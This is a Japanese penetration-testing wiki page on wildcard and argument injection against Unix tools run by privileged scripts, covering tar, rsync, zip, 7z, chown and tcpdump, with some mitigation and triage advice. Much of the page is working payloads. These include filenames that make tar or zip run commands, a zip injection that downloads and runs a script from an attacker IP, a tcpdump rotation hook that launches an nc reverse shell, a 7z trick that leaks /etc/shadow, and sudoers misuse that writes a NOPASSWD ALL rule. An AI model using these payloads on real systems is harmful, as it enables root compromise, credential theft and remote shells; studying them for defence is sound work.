# Wildcards の便利な小技

{{#include ../../banners/hacktricks-training.md}}

> Wildcard（別名 *glob*）の**argument injection**は、特権スクリプトが `tar`、`chown`、`rsync`、`zip`、`7z` などの Unix バイナリを、引用符で囲まれていない `*` のような wildcard を使って実行すると発生します。  
> バイナリの実行前にシェルが wildcard を展開するため、作業ディレクトリ内にファイルを作成できる攻撃者は、`-` で始まるファイル名を仕込むことで、それらをデータではなく**オプションとして**解釈させ、任意のフラグやコマンドまでも密かに渡すことができます。<sup>[[6]](#references)</sup>
> このページでは、2023〜2025年の最も有用なプリミティブ、最新の研究、最新の検出方法を紹介します。

## chown / chmod

wildcard によって展開されるオプションのようなファイル名を利用し、`--reference` フラグを悪用すると、参照ファイルから**所有者／グループやアクセス権ビットをコピーできます**。<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
# attacker-controlled directory
touch -- .drf.php
chmod 777 -- .drf.php
touch -- "--reference=.drf.php"   # ← filename becomes an argument
```

rootが後で次のようなものを実行すると:

```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```

展開された `--reference=.drf.php` は明示的に指定された所有者／モードを上書きするため、一致するファイルは `.drf.php` のメタデータを引き継ぎます（上記の設定では、攻撃者が書き込み可能になります）。<sup>[[6]](#references)</sup>

`chown` の行だけでなく、特権ヘルパー全体を確認してください。所有者を変更すると、set-user-ID ビットや set-group-ID ビットがクリアされる場合があります。[POSIX では、特権が関係する場合の動作は実装定義です](https://pubs.opengroup.org/onlinepubs/9699919799.2013edition/functions/chown.html)。同じジョブ内で後から実行される `chmod` が、それ以前に選択されたファイルのこれらのビットを復元し、結果を変える可能性もあります。これを実行ファイルを介した権限昇格経路とみなす前に、実際のコマンド順序、書き込み可能な glob ディレクトリ、影響を受けるファイルとリンクの動作、変更後の所有者とモード、そしてマウントが set-user-ID を有効にするかを確認してください。ヘルパーの内容を読めなければ、これらの手順は不明なままです。

*PoC とツール*: [`wildpwn`](https://github.com/localh0t/wildpwn)（複合攻撃）。<sup>[[7]](#references)</sup>
詳細については、古典的な DefenseCode の論文も参照してください。<sup>[[6]](#references)</sup>

---

## 特権スクリプト内の GNU `cp`

呼び出し元が選んだ作業ディレクトリから、`cp .version * /etc/app/staged/` のように裸の glob を使ってコピーする、root で実行されるスクリプトを確認してください。低い権限のユーザーがそのディレクトリにファイル名を作成できる場合、GNU `cp` は `*` の展開結果に含まれる、先頭がハイフンのファイル名をオプションとして解釈することがあります。その `--preserve=mode` オプションは新しいコピーにソースのモードビットを保持させることがあり、`--target-directory` はコピー先を変更できます。いずれの影響についても、実際のスクリプト分岐、コピー先の状態、実効権限、ファイルシステムのポリシー、GNU `cp` の動作を確認する必要があります。sudo ルールやスクリプトの記述だけでは、権限昇格の証明にはなりません。オペランドに `./` を付けるか、`--` でオプション解析を終了すれば、GNU `cp` が先頭のハイフンをオプションとして解釈するのを防げます（[GNU Coreutils FAQ](https://www.gnu.org/software/coreutils/faq/coreutils-faq.html)、[`cp` のマニュアル](https://www.gnu.org/software/coreutils/manual/html_node/cp-invocation.html)）。

---

## tar

### GNU tar

GNU tar の **checkpoint** 機能と checkpoint アクションを悪用して、任意のコマンドを実行します。<sup>[[10]](#references)</sup>

```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```

root がたとえば `tar -czf /root/backup.tgz *` を実行すると、`shell.sh` が root 権限で実行されます。<sup>[[10]](#references)</sup>

### bsdtar / macOS の compressor override に関する注意点

最近の macOS のデフォルトの `tar`（`libarchive` ベース）には、GNU tar の `--checkpoint` インターフェースはありませんが、bsdtar では外部 compressor を選択するための **--use-compress-program** が文書化されています。<sup>[[11]](#references)</sup>

```bash
# macOS example
touch -- "--use-compress-program=sh"
```
特権スクリプトが `tar -cf backup.tar *` を実行すると、これは被害者の `PATH` 経由で `sh` を選択し、bsdtar はそれを圧縮プログラムとして起動します。<sup>[[11]](#references)</sup> これはオプションインジェクションを示していますが、それだけでは信頼できる任意コマンド実行プリミティブにはなりません。ワイルドカードで作成されるファイル名には `/` を含められず、bsdtar が渡すのはアーカイブデータであって、攻撃者が選択したシェルコマンドではないためです。コード実行には、`PATH` 経由で解決される制御可能な実行ファイル、または有用なプログラムを指定できる別の引数経路も必要です。

---

## rsync

`rsync` では、`-e` や `--rsync-path` などのコマンドラインフラグを使って、リモートシェルまたはリモートバイナリを上書きできます。<sup>[[12]](#references)</sup>

```bash
# attacker-controlled directory
touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```

rootが後で`rsync -az * backup:/srv/`を使ってディレクトリをアーカイブすると、注入したflagによってリモートシェル機構経由でシェルを実行できます。<sup>[[7]](#references)[[12]](#references)</sup>

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn)（`rsync`モード）。

---

## 7-Zip / 7z / 7za

特権スクリプトがオプション解析を止めるために、ワイルドカードの前に`--`を付けて*防御的に*処理していても、7-Zip CLIはファイル名の先頭に`@`を付けることで**ファイルリストファイル**を受け付けます。これとシンボリックリンクを組み合わせると、*任意のファイルを外部に持ち出せます*。<sup>[[13]](#references)</sup>

```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```

root が次のようなものを実行すると:

```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```

7-Zip は `root.txt`（→ `/etc/shadow`）をファイルリストとして読み込もうとし、処理を中断して、**内容を stderr に出力します**。<sup>[[13]](#references)</sup>

これは `-- *` を使っても回避できません。7-Zip の CLI は通常のファイル名と `@listfiles` の両方を位置引数として明示的に受け付けるため、`@root.txt` のような文字列そのもののファイル名も特別扱いされます。<sup>[[13]](#references)</sup>

---

## zip

アプリケーションがユーザー制御可能なファイル名を（ワイルドカード経由、または `--` を使わずに名前を列挙して）`zip` に渡す場合、非常に実用的なプリミティブが 2 つあります。<sup>[[2]](#references)[[3]](#references)</sup>

- テストフック経由のRCE: `-T` は「アーカイブをテストする」機能を有効にし、`-TT <cmd>` はテスターを任意のプログラムに置き換えます（長形式: `--unzip-command <cmd>`）。`-` で始まるファイル名を注入できる場合は、短いオプションの解析が機能するよう、フラグを個別のファイル名に分けてください。<sup>[[2]](#references)[[3]](#references)</sup>

```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```

メモ
- `'-T -TT <cmd>'` のような単一のファイル名は使わないでください。短いオプションは文字ごとに解析されるため、失敗します。以下のように別々のトークンを使ってください。<sup>[[3]](#references)</sup>
- アプリによってファイル名からスラッシュが取り除かれる場合は、ホスト/IPのみを指定して取得し（デフォルトのパスは `/index.html`）、`-O` でローカルに保存してから実行してください。<sup>[[3]](#references)</sup>
- `-sc`（処理後の argv を表示）または `-h2`（詳細なヘルプ）を使って解析をデバッグし、トークンがどのように処理されるか確認できます。<sup>[[3]](#references)</sup>

例（zip 3.0でのローカルでの挙動）。<sup>[[3]](#references)</sup>

```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```

- Data exfil/leak: Web 層が `zip` の stdout/stderr を返す場合（単純なラッパーではよくある）、`--help` などの注入されたフラグや、不正なオプションによるエラーが HTTP レスポンスに表示され、コマンドラインインジェクションの確認やペイロードの調整に役立ちます。<sup>[[3]](#references)</sup>

---

## Additional option-injection candidates

特権ラッパーがワイルドカードを使って書き込み可能なディレクトリを展開する場合、以下に記載されたオプションフックを確認する価値があります。<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

| Binary | 悪用するフラグ | 効果 |
| --- | --- | --- |
| `flock` | `-c <cmd>` | コマンド文字列をシェルに渡す |
| `git`   | `-c core.sshCommand=<cmd>` | Git の fetch/push で SSH の代わりに `<cmd>` を使用する |
| `scp`   | `-S <program>` | SSH 互換の接続プログラムを別途使用する |

これらのプリミティブは、定番の *tar/rsync/zip* 以外の確認にも役立ちます。

---

## 脆弱なラッパーやジョブの調査

最近の事例研究や検出ガイダンスによると、wildcard/argv injection はもはや **cron + tar** だけの問題ではありません。<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> 同じ種類のバグは、次のような場所でも繰り返し発生しています。

- 攻撃者が制御するアップロードディレクトリから「すべてを zip/tar でダウンロード」する Web 機能
- 攻撃者が制御できるファイル名やフィルターフィールドを持つ **tcpdump** ラッパーを公開する、ベンダー製品やアプライアンスのデバッグシェル
- 書き込み可能なディレクトリに対して `tar`、`rsync`、`7z`、`zip`、`chown`、`chmod` を実行するバックアップまたはローテーションジョブ

有用なトリアージコマンド（`pspy` の呼び出しでは、ドキュメントに記載されたプロセス/ファイルイベントおよび間隔のフラグを使用します）。<sup>[[14]](#references)</sup>

```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
  '(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
  /etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```

簡単なヒューリスティック:

- 多くの GNU ツールでは `-- *` が有効な対策ですが、`@listfiles` は別途解析されるため、`7z`/`7za` には有効ではありません。<sup>[[13]](#references)</sup>
- `zip` では、ユーザーが制御できるファイル名を直接列挙するラッパーを探してください。シェル glob がなくても、短いオプションの分割（`-T` + `-TT <cmd>`）は引き続き機能します。<sup>[[2]](#references)[[3]](#references)</sup>
- `tcpdump` では、**出力ファイル名**、**ローテーション設定**、または**キャプチャファイルの再生**引数を制御できるラッパーに特に注意してください。<sup>[[18]](#references)</sup>

---

## tcpdump のローテーションフック（-G/-W/-z）：ラッパーでの argv injection による RCE

制限付きシェルやベンダー製ラッパーが、ユーザー制御のフィールド（「ファイル名」パラメーターなど）を厳密なクォートや検証なしに連結して `tcpdump` コマンドラインを組み立てる場合、追加の `tcpdump` フラグを紛れ込ませることができます。`-G`（時間ベースのローテーション）、`-W`（ファイル数の上限）、`-z <cmd>`（ローテーション後に実行するコマンド）を組み合わせると、`tcpdump` を実行しているユーザー（アプライアンスでは root のことが多い）として任意のコマンドを実行できます。<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>

前提条件:

- `tcpdump` に渡される `argv` に影響を与えられること（例：`/debug/tcpdump --filter=... --file-name=<HERE>` のようなラッパー経由）。<sup>[[4]](#references)[[18]](#references)</sup>
- ラッパーが、ファイル名フィールド内のスペースや `-` で始まるトークンをサニタイズしないこと。<sup>[[4]](#references)</sup>

典型的な PoC（書き込み可能なパスにある reverse shell スクリプトを実行）。<sup>[[4]](#references)[[18]](#references)</sup>

```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
  --file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```

詳細:

- `-G 1` は毎秒ローテーションし、`-W 1` はローテーション済みファイルを1つ作成した時点で停止します。ローテーション前に、キャプチャ対象のパケットを受信する必要があります。<sup>[[18]](#references)</sup>
- `-z <cmd>` はローテーションごとに post-rotate コマンドを1回実行し、閉じた savefile のパスを引数として渡します。スクリプト／インタープリターの引数処理がペイロードと一致していることを確認してください。<sup>[[18]](#references)</sup>

リムーバブルメディアを使わない方法:

- ファイルを書き込む別の primitive（出力リダイレクトを許可する別のコマンドラッパーなど）があれば、既知のパスにスクリプトを配置し、`-z /path/script.sh` を実行します。必要であれば、スクリプトから `/bin/sh` を呼び出してください。<sup>[[18]](#references)</sup>
- ベンダーのラッパーでローテーション後のパスを指定できる場合は、savefile 引数を解釈する post-rotate コマンドと組み合わせた場合に限り、そのパス制御を監査してください。パスを制御できるだけでは、ファイルの内容は実行されません。<sup>[[18]](#references)</sup>

---

## sudoers: tcpdump のワイルドカード／追加引数 → 任意の読み書きと root

sudoers のアンチパターン例:<sup>[[3]](#references)</sup>

```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```

このルールでは、tcpdump の文書化されたパーサーで複数の選択肢が利用できます:<sup>[[3]](#references)[[18]](#references)</sup>
- `*` glob と制約の緩いパターンが制限するのは、最初の `-w` 引数だけです。`tcpdump` は複数の `-w` オプションを受け付け、最後のものが有効になります。<sup>[[3]](#references)[[18]](#references)</sup>
- このルールはほかのオプションを制限しないため、`-Z`、`-r`、`-V` なども使用できます。<sup>[[3]](#references)[[18]](#references)</sup>

関連するプリミティブを以下に示します。<sup>[[3]](#references)[[18]](#references)</sup>
- 2つ目の `-w` で出力先パスを上書きする（最初のものは sudoers を満たすためだけに指定）。<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
  -w /dev/shm/out.pcap \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- 最初の `-w` 内で Path traversal を行い、制約されたツリーから脱出する。<sup>[[3]](#references)</sup>

```bash
sudo tcpdump -c10 \
  -w/var/cache/captures/a/../../../../dev/shm/out \
  -F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- `-Z root` で出力ファイルの所有者を強制する（任意の場所に root 所有のファイルを作成する）。<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
  -w /dev/shm/root-owned \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- `-r` を使って細工した PCAP を再生し、任意の内容を書き込む（例: sudoers に1行追加する）。<sup>[[3]](#references)[[18]](#references)</sup>

<details>
<summary>正確な ASCII ペイロードを含む PCAP を作成し、root として書き込む</summary>

```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
  -r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- `-V <file>`（savefiles のリストとして解釈）を使った任意ファイルの読み取り/secret leak。エラーメッセージに行がそのまま出力され、内容が漏れることがよくあります。<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
  -w /tmp/dummy \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

---

## References

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: Zip arg injectionによるRCE + tcpdump sudo misconfigによるprivesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - Exploit Chainの全容](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Wildcard InjectionによるShellの可能性を検出](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [未来への回帰: Unixのワイルドカードが暴走 (DefenseCode)](https://www.exploit-db.com/papers/33930)
- [7] [wildpwn](https://github.com/localh0t/wildpwn)
- [8] [GNU Coreutils `chown` の呼び出し](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
- [9] [GNU Coreutils `chmod` の呼び出し](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
- [10] [GNU tar のチェックポイント](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
- [11] [bsdtar(1) マニュアル](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
- [12] [rsync(1) マニュアル](https://download.samba.org/pub/rsync/rsync.1)
- [13] [7-Zip コマンドライン構文](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
- [14] [pspy](https://github.com/DominicBreuker/pspy)
- [15] [flock(1) マニュアル](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
- [16] [Git 設定ドキュメント](https://git-scm.com/docs/git-config)
- [17] [OpenBSD `scp` マニュアル](https://man.openbsd.org/scp)
- [18] [tcpdump(8) マニュアル](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
{{#include ../../banners/hacktricks-training.md}}
